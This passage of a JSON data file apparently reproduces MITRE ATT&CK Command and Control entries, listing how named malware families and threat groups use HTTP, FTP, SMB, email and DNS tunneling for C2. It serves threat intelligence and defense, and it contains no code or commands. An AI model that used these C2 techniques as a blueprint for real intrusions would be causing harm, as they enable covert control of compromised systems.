                        "Description": "<name> has the ability to use HTTP in C2 communications.[220][221]"
                    },
                    "S0444": {
                        "ID": "S0444",
                        "Name": "ShimRat",
                        "Description": "<name> communicated over HTTP and HTTPS with C2 servers.[313]"
                    },
                    "S0445": {
                        "ID": "S0445",
                        "Name": "ShimRatReporter",
                        "Description": "<name> communicated over HTTP with preconfigured C2 servers.[313]"
                    },
                    "S0589": {
                        "ID": "S0589",
                        "Name": "Sibot",
                        "Description": "<name> communicated with its C2 server via HTTP GET requests.[153]"
                    },
                    "S0610": {
                        "ID": "S0610",
                        "Name": "SideTwist",
                        "Description": "<name> has used HTTP GET and POST requests over port 443 for C2.[314]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has used HTTP in C2 communications.[315][316][317]"
                    },
                    "G0083": {
                        "ID": "G0083",
                        "Name": "SilverTerrier",
                        "Description": "<name> uses HTTP for C2 communications.[318]"
                    },
                    "S1110": {
                        "ID": "S1110",
                        "Name": "SLIGHTPULSE",
                        "Description": "<name> has the ability to process HTTP GET requests as a normal web server and to insert logic that will read or write files or execute commands in response to HTTP POST requests.[268]"
                    },
                    "S0633": {
                        "ID": "S0633",
                        "Name": "Sliver",
                        "Description": "<name> has the ability to support C2 communications over HTTP/S.[319][320][321]"
                    },
                    "S0533": {
                        "ID": "S0533",
                        "Name": "SLOTHFULMEDIA",
                        "Description": "<name> has used HTTP and HTTPS for C2 communications.[322]"
                    },
                    "S1035": {
                        "ID": "S1035",
                        "Name": "Small Sieve",
                        "Description": "<name> can contact actor-controlled C2 servers by using the Telegram API over HTTPS.[225]"
                    },
                    "S0226": {
                        "ID": "S0226",
                        "Name": "Smoke Loader",
                        "Description": "<name> uses HTTP for C2.[323]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> has communicated with its C2 servers via HTTPS and HTTP POST requests.[324]"
                    },
                    "S0159": {
                        "ID": "S0159",
                        "Name": "SNUGRIDE",
                        "Description": "<name> communicates with its C2 server over HTTP.[286]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used HTTP for C2 and data exfiltration.[325]"
                    },
                    "S0516": {
                        "ID": "S0516",
                        "Name": "SoreFang",
                        "Description": "<name> can use HTTP in C2 communications.[326][327]"
                    },
                    "S0543": {
                        "ID": "S0543",
                        "Name": "Spark",
                        "Description": "<name> has used HTTP POST requests to communicate with its C2 server to receive commands.[328]"
                    },
                    "S0374": {
                        "ID": "S0374",
                        "Name": "SpeakUp",
                        "Description": "<name> uses POST and GET requests over HTTP to communicate with its main C&C server. [329]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has used HTTP POST requests for C2 communications.[330]"
                    },
                    "S1037": {
                        "ID": "S1037",
                        "Name": "STARWHALE",
                        "Description": "<name> has the ability to contact actor-controlled C2 servers via HTTP.[331][225]"
                    },
                    "S1112": {
                        "ID": "S1112",
                        "Name": "STEADYPULSE",
                        "Description": "<name> can parse web requests made to a targeted server to determine the next stage of execution.[268]"
                    },
                    "G0038": {
                        "ID": "G0038",
                        "Name": "Stealth Falcon",
                        "Description": "<name> malware communicates with its C2 server via HTTPS.[332]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> can use HTTP and HTTPS in C2 communications.[333][334]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> uses HTTP to communicate with a command and control server. [335]"
                    },
                    "S1042": {
                        "ID": "S1042",
                        "Name": "SUGARDUMP",
                        "Description": "A <name> variant has used HTTP for C2.[336]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> communicated via HTTP GET or HTTP POST requests to third party servers for C2.[337]"
                    },
                    "S0578": {
                        "ID": "S0578",
                        "Name": "SUPERNOVA",
                        "Description": "<name> had to receive an HTTP GET request containing a specific set of parameters in order to execute.[338][339]"
                    },
                    "S1064": {
                        "ID": "S1064",
                        "Name": "SVCReady",
                        "Description": "<name> can communicate with its C2 servers via HTTP.[340]"
                    },
                    "S0060": {
                        "ID": "S0060",
                        "Name": "Sys10",
                        "Description": "<name> uses HTTP for C2.[341]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used HTTP to communicate with C2 nodes.[342]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has used HTTP for C2 communications.[343]"
                    },
                    "S0011": {
                        "ID": "S0011",
                        "Name": "Taidoor",
                        "Description": "<name> has used HTTP GET and POST requests for C2.[344]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has the curl command to send credentials over HTTP and the curl and wget commands to download new software.[345][346][347] <name> has also used a custom user agent HTTP header in shell scripts.[348]"
                    },
                    "S0595": {
                        "ID": "S0595",
                        "Name": "ThiefQuest",
                        "Description": "<name> uploads files via unencrypted HTTP. [349][350]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> malware has used HTTP for C2.[351]"
                    },
                    "S0668": {
                        "ID": "S0668",
                        "Name": "TinyTurla",
                        "Description": "<name> can use HTTPS in C2 communications.[352]"
                    },
                    "S0671": {
                        "ID": "S0671",
                        "Name": "Tomiris",
                        "Description": "<name> can use HTTP to establish C2 communications.[353]"
                    },
                    "S0678": {
                        "ID": "S0678",
                        "Name": "Torisma",
                        "Description": "<name> can use HTTP and HTTPS for C2 communications.[354]"
                    },
                    "S0682": {
                        "ID": "S0682",
                        "Name": "TrailBlazer",
                        "Description": "<name> has used HTTP requests for C2.[355]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.[356][10]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> can communicate with C2 via HTTP POST requests.[357]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has used HTTP in communication with the C2.[358][359]"
                    },
                    "S0436": {
                        "ID": "S0436",
                        "Name": "TSCookie",
                        "Description": "<name> can multiple protocols including HTTP and HTTPS in communication with command and control (C2) servers.[360][361]"
                    },
                    "S0647": {
                        "ID": "S0647",
                        "Name": "Turian",
                        "Description": "<name> has the ability to use HTTP for its C2.[362]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used HTTP and HTTPS for C2 communications.[363][364]"
                    },
                    "S0333": {
                        "ID": "S0333",
                        "Name": "UBoatRAT",
                        "Description": "<name> has used HTTP for C2 communications.[365]"
                    },
                    "S0275": {
                        "ID": "S0275",
                        "Name": "UPPERCUT",
                        "Description": "<name> has used HTTP for C2, including sending error codes in Cookie headers.[366]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can use a custom HTTP-based protocol for large data communications that can blend with normal network traffic by riding on top of standard HTTP.[367]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has used HTTPS for C2.[368][369][370]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has used HTTP in communications with C2.[371][343]"
                    },
                    "S0636": {
                        "ID": "S0636",
                        "Name": "VaporRage",
                        "Description": "<name> can use HTTP to download shellcode from compromised websites.[49]"
                    },
                    "S0207": {
                        "ID": "S0207",
                        "Name": "Vasport",
                        "Description": "<name> creates a backdoor by making a connection using a HTTP POST.[372]"
                    },
                    "S0442": {
                        "ID": "S0442",
                        "Name": "VBShower",
                        "Description": "<name> has attempted to obtain a VBS script from command and control (C2) nodes over HTTP.[373]"
                    },
                    "S0257": {
                        "ID": "S0257",
                        "Name": "VERMIN",
                        "Description": "<name> uses HTTP for C2 communications.[374]"
                    },
                    "S0514": {
                        "ID": "S0514",
                        "Name": "WellMess",
                        "Description": "<name> can use HTTP and HTTPS in C2 communications.[375][376][377][327]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can make an HTTPS connection to download additional files.[378][379]"
                    },
                    "G0112": {
                        "ID": "G0112",
                        "Name": "Windshift",
                        "Description": "<name> has used tools that communicate with C2 over HTTP.[380]"
                    },
                    "S0466": {
                        "ID": "S0466",
                        "Name": "WindTail",
                        "Description": "<name> has the ability to use HTTP for C2 communications.[381]"
                    },
                    "S0059": {
                        "ID": "S0059",
                        "Name": "WinMM",
                        "Description": "<name> uses HTTP for C2.[341]"
                    },
                    "S0430": {
                        "ID": "S0430",
                        "Name": "Winnti for Linux",
                        "Description": "<name> has used HTTP in outbound communications.[382]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "<name> has the ability to use encapsulated HTTP/S in C2 communications.[383]"
                    },
                    "S1115": {
                        "ID": "S1115",
                        "Name": "WIREFIRE",
                        "Description": "<name> can respond to specific HTTP POST requests to /api/v1/cav/client/visits.[384][385]"
                    },
                    "G0090": {
                        "ID": "G0090",
                        "Name": "WIRTE",
                        "Description": "<name> has used HTTP for network communication.[386]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used HTTP for network communications.[387]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> can communicate with its C2 server using HTTP requests.[388]"
                    },
                    "S0341": {
                        "ID": "S0341",
                        "Name": "Xbash",
                        "Description": "<name> uses HTTP for C2 communications.[389]"
                    },
                    "S0653": {
                        "ID": "S0653",
                        "Name": "xCaon",
                        "Description": "<name> has communicated with the C2 server by sending POST requests over HTTP.[390]"
                    },
                    "S0388": {
                        "ID": "S0388",
                        "Name": "YAHOYAH",
                        "Description": "<name> uses HTTP for C2.[391]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> uses HTTP for C2.[392][393][394][395][396][397]"
                    },
                    "S0230": {
                        "ID": "S0230",
                        "Name": "ZeroT",
                        "Description": "<name> has used HTTP for C2.[398][399]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> uses HTTP for C2 communications.[400]"
                    },
                    "S0086": {
                        "ID": "S0086",
                        "Name": "ZLib",
                        "Description": "<name> communicates over HTTP for C2.[222]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> has used HTTP for C2 connections.[401]"
                    }
                }
            },
            "002": {
                "name": "File Transfer Protocols",
                "href": "/techniques/T1071/002",
                "description": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMB[1], FTP[2], FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used exploit payloads that initiate download via ftp.[3]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name> has used FTP protocol for C2 communication.[4]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can emulate an FTP server to connect to actor-controlled C2 servers.[5]"
                    },
                    "S0465": {
                        "ID": "S0465",
                        "Name": "CARROTBALL",
                        "Description": "<name> has the ability to use FTP in C2 communications.[6]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can conduct peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.[7][8]"
                    },
                    "S1088": {
                        "ID": "S1088",
                        "Name": "Disco",
                        "Description": "<name> can use SMB to transfer files.[9]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has used SMB for C2.[1]"
                    },
                    "S0201": {
                        "ID": "S0201",
                        "Name": "JPIN",
                        "Description": "<name> can communicate over FTP.[10]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> uses FTP and FTPS to communicate with the C2 server.[11]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used FTP to download additional malware to the target machine.[12]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> uses FTP for Command & Control.[2][13][14]"
                    },
                    "S0699": {
                        "ID": "S0699",
                        "Name": "Mythic",
                        "Description": "<name> supports SMB-based peer-to-peer C2 profiles.[15]"
                    },
                    "S0353": {
                        "ID": "S0353",
                        "Name": "NOKKI",
                        "Description": "<name> has used FTP for C2 communications.[16]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, the threat actors had the ability to use FTP for C2.[17]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has used FTP for C2 communications.[18]"
                    },
                    "S0019": {
                        "ID": "S0019",
                        "Name": "Regin",
                        "Description": "The <name> malware platform supports many standard protocols, including SMB.[19]"
                    },
                    "S0596": {
                        "ID": "S0596",
                        "Name": "ShadowPad",
                        "Description": "<name> has used FTP for C2 communications.[20]"
                    },
                    "S1089": {
                        "ID": "S1089",
                        "Name": "SharpDisco",
                        "Description": "<name> has the ability to transfer data between SMB shares.[9]"
                    },
                    "G0083": {
                        "ID": "G0083",
                        "Name": "SilverTerrier",
                        "Description": "<name> uses FTP for C2 communications.[21]"
                    },
                    "S0464": {
                        "ID": "S0464",
                        "Name": "SYSCON",
                        "Description": "<name> has the ability to use FTP in C2 communications.[22][6]"
                    },
                    "S0161": {
                        "ID": "S0161",
                        "Name": "XAgentOSX",
                        "Description": "<name> contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.[23]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> has used FTP for C2 connections.[24]"
                    }
                }
            },
            "003": {
                "name": "Mail Protocols",
                "href": "/techniques/T1071/003",
                "description": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.[1]",
                "Procedure": {
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> has used SMTP for C2 communications.[2][3][4]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims.[1][5]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used email for C2 via an Office macro.[6][7]"
                    },
                    "S0337": {
                        "ID": "S0337",
                        "Name": "BadPatch",
                        "Description": "<name> uses SMTP for C2.[8]"
                    },
                    "S0351": {
                        "ID": "S0351",
                        "Name": "Cannon",
                        "Description": "<name> uses SMTP/S and POP3/S for C2 communications by sending and receiving emails.[9]"
                    },
                    "S0023": {
                        "ID": "S0023",
                        "Name": "CHOPSTICK",
                        "Description": "Various implementations of <name> communicate with C2 over SMTP and POP3.[10]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> can use email attachments for command and control.[11]"
                    },
                    "S0137": {
                        "ID": "S0137",
                        "Name": "CORESHELL",
                        "Description": "<name> can communicate over SMTP and POP3 for C2.[1][12]"
                    },
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.[7]"
                    },
                    "S0201": {
                        "ID": "S0201",
                        "Name": "JPIN",
                        "Description": "<name> can send email over SMTP.[13]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used e-mail to send exfiltrated data to C2 servers.[14]"
                    },
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> uses SMTP for C2.[15]"
                    },
                    "S0247": {
                        "ID": "S0247",
                        "Name": "NavRAT",
                        "Description": "<name> uses the email platform, Naver, for C2 communications, leveraging SMTP.[16]"
                    },
                    "S1090": {
                        "ID": "S1090",
                        "Name": "NightClub",
                        "Description": "<name> can use emails for C2 communications.[17]"
                    },
                    "S0138": {
                        "ID": "S0138",
                        "Name": "OLDBAIT",
                        "Description": "<name> can use SMTP for C2.[1]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> can use email attachments for C2 communications.[18]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> is capable of using SMTP for C2.[19][20][21][22]"
                    },
                    "G0083": {
                        "ID": "G0083",
                        "Name": "SilverTerrier",
                        "Description": "<name> uses SMTP for C2 communications.[23]"
                    },
                    "S1042": {
                        "ID": "S1042",
                        "Name": "SUGARDUMP",
                        "Description": "A <name> variant used SMTP for C2.[24]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used multiple backdoors which communicate with a C2 server via email attachments.[25]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can use custom communications protocols that ride over SMTP.[26]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> uses SMTP and POP3 for C2.[27][9][28][29][30]"
                    }
                }
            },
            "004": {
                "name": "DNS",
                "href": "/techniques/T1071/004",
                "description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.[1][2]",
                "Procedure": {
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "Variants of <name> can use DNS tunneling to communicate with C2.[3][4]"
                    },
                    "G0026": {
                        "ID": "G0026",
                        "Name": "APT18",
                        "Description": "<name> uses DNS for C2 communications.[5]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used remote access tools that leverage DNS in communications with C2.[6]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used DNS for C2 communications.[7][8]"
                    },
                    "S0360": {
                        "ID": "S0360",
                        "Name": "BONDUPDATER",
                        "Description": "<name> can use DNS and TXT records within its DNS tunneling protocol for command and control.[9]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can use DNS over HTTPS for C2.[10][11]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used Cobalt Strike to encapsulate C2 in DNS traffic.[12]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has used DNS tunneling for C2.[13][14][15]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use a custom command and control protocol that can be encapsulated in DNS. All protocols use their standard assigned ports.[16][17][18]"
                    },
                    "S0338": {
                        "ID": "S0338",
                        "Name": "Cobian RAT",
                        "Description": "<name> uses DNS for C2.[19]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors used DNS to tunnel IPv4 C2 traffic.[20]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> can use use IPv4 A records and IPv6 AAAA DNS records in C2 communications.[21]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> can cloak command and control traffic in DNS records from legitimate services to avoid reputation-based detection techniques. [22]"
                    },
                    "S0354": {
                        "ID": "S0354",
                        "Name": "Denis",
                        "Description": "<name> has used DNS tunneling for C2 communications.[23][24][25]"
                    },
                    "S1021": {
                        "ID": "S1021",
                        "Name": "DnsSystem",
                        "Description": "<name>  can direct queries to custom DNS servers and return C2 commands using TXT records.[26]"
                    },
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> has used DNS requests over UDP port 53 for C2.[27]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has performed C2 using DNS via A, OPT, and TXT records.[28]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> has the ability to use DNS in communication with C2.[29]"
                    },
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has the ability to communicate with its C2 over DNS.[25]"
                    },
                    "S0690": {
                        "ID": "S0690",
                        "Name": "Green Lambert",
                        "Description": "<name> can use DNS for C2 communications.[30][31]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> can use DNS for C2.[32]"
                    },
                    "S1027": {
                        "ID": "S1027",
                        "Name": "Heyoka Backdoor",
                        "Description": "<name> can use DNS tunneling for C2 communications.[33]"
                    },
                    "S0070": {
                        "ID": "S0070",
                        "Name": "HTTPBrowser",
                        "Description": "<name> has used DNS for command and control.[34][35]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has used a custom implementation of DNS tunneling to embed C2 communications in DNS requests and replies.[36]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> malware RoyalDNS has used DNS for C2.[37]"
                    },
                    "S1020": {
                        "ID": "S1020",
                        "Name": "Kevin",
                        "Description": "Variants of <name> can communicate over DNS through queries to the server for constructed domain names with embedded information.[38]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has leveraged dynamic DNS providers for C2 communications.[39]"
                    },
                    "S0167": {
                        "ID": "S0167",
                        "Name": "Matryoshka",
                        "Description": "<name> uses DNS for C2.[40][41]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> has the ability to use DNS for C2 communications.[42][38][43]"
                    },
                    "S1047": {
                        "ID": "S1047",
                        "Name": "Mori",
                        "Description": "<name> can use DNS tunneling to communicate with C2.[44][45]"
                    },
                    "S0699": {
                        "ID": "S0699",
                        "Name": "Mythic",
                        "Description": "<name> supports DNS-based C2 profiles.[46]"
                    },
                    "S0228": {
                        "ID": "S0228",
                        "Name": "NanHaiShu",
                        "Description": "<name> uses DNS for the C2 communications.[47]"
                    },
                    "S1090": {
                        "ID": "S1090",
                        "Name": "NightClub",
                        "Description": "<name> can use a DNS tunneling plugin to exfiltrate data by adding it to the subdomain portion of a DNS request.[48]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used DNS for C2 including the publicly available requestbin.net tunneling service.[49][50][51][52]"
                    },
                    "S0124": {
                        "ID": "S0124",
                        "Name": "Pisloader",
                        "Description": "<name> uses DNS as its C2 protocol.[53]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> can be configured to use DNS for command and control.[34]"
                    },
                    "S0145": {
                        "ID": "S0145",
                        "Name": "POWERSOURCE",
                        "Description": "<name> uses DNS TXT records for C2.[54][55]"
                    },
                    "S0184": {
                        "ID": "S0184",
                        "Name": "POWRUNER",
                        "Description": "<name> can use DNS for C2 communications.[56][50]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> uses DNS for C2 communications.[57]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> has used DNS to communicate with the C2.[58]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> is capable of using DNS for C2.[59][60][61]"
                    },
                    "S0596": {
                        "ID": "S0596",
                        "Name": "ShadowPad",
                        "Description": "<name> has used DNS tunneling for C2 communications.[62]"
                    },
                    "S1019": {
                        "ID": "S1019",
                        "Name": "Shark",
                        "Description": "<name> can use DNS in C2 communications.[42][43]"
                    },
                    "S0633": {
                        "ID": "S0633",
                        "Name": "Sliver",
                        "Description": "<name> can support C2 communications over DNS.[63][64][65]"
                    },
                    "S0615": {
                        "ID": "S0615",
                        "Name": "SombRAT",
                        "Description": "<name> can communicate over DNS with the C2 server.[66][67]"
                    },
                    "S0157": {
                        "ID": "S0157",
                        "Name": "SOUNDBITE",
                        "Description": "<name> communicates via DNS for C2.[68]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> used DNS for C2 traffic designed to mimic normal SolarWinds API communications.[69]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> has used DNS TXT requests as for its C2 communication.[70]"
                    },
                    "S0146": {
                        "ID": "S0146",
                        "Name": "TEXTMATE",
                        "Description": "<name> uses DNS TXT records for C2.[54]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name>'s backdoor has communicated to the C2 over the DNS protocol.[71]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> has encoded outbound C2 communications in DNS requests consisting of character strings made to resemble standard domain names. The actual information transmitted by <name> is contained in the part of the character string prior to the first \u2018.\u2019 character.[72]"
                    },
                    "S0514": {
                        "ID": "S0514",
                        "Name": "WellMess",
                        "Description": "<name> has the ability to use DNS tunneling for C2 communications.[73][74]"
                    }
                }
            }
        },
        "tactic": "Command and Control",
        "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.[1]",
        "Procedure": {
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware has the ability to use Telnet for communication.[2]"
            },
            "S0038": {
                "ID": "S0038",
                "Name": "Duqu",
                "Description": "malware uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.[3]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has used an IRC channel for C2 communications.[4]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server.[5]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware malware has used IRC for C2.[6][7]"
            },
            "S0034": {
                "ID": "S0034",
                "Name": "NETEAGLE",
                "Description": "Adversaries can also use malware to establish an RDP connection with a controller over TCP/7519."
            },
            "S1084": {
                "ID": "S1084",
                "Name": "QUIETEXIT",
                "Description": "malware can use an inverse negotiated SSH connection as part of its C2.[1]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware issued wget requests from infected systems to the C2.[8]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware connects to an IRC server for C2.[9]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has used an IRC bot for C2 communications.[10]"
            }
        }
    },
    "T1092": {
        "ttp_name": "Communication Through Removable Media",
        "ttp_id": "T1092",
        "href": "/techniques/T1092",
        "tactic": "Command and Control",
        "description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.[1] Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.[2]"
            },
            "S0023": {
                "ID": "S0023",
                "Name": "CHOPSTICK",
                "Description": "Part of APT28's operation involved using malware modules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.[3][4][2]"
            },
            "S0136": {
                "ID": "S0136",
                "Name": "USBStealer",
                "Description": "malware drops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim.[1]"
            }
        }
    },
    "T1132": {
        "ttp_name": "Data Encoding",
        "ttp_id": "T1132",
        "href": "/techniques/T1132",
        "subtechnique": {
            "001": {
                "name": "Standard Encoding",
                "href": "/techniques/T1132/001",
